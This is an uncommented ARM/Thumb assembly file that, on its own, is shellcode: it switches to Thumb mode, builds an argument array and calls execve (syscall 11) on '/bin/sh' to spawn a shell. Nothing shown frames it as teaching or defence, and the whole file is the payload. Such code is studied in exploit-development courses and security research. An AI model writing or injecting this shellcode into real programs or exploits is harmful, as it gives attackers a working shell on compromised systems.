.global _start
.section .text    

_start:
    .arm
    add r6, pc, #1
    bx r6

    .thumb
    adr r0, bin_sh
    movs r2, #0
    movs r7, #11
    push {r0, r2}
    mov r1, sp
    svc 1

bin_sh:
    .asciz "/bin/sh\x00"
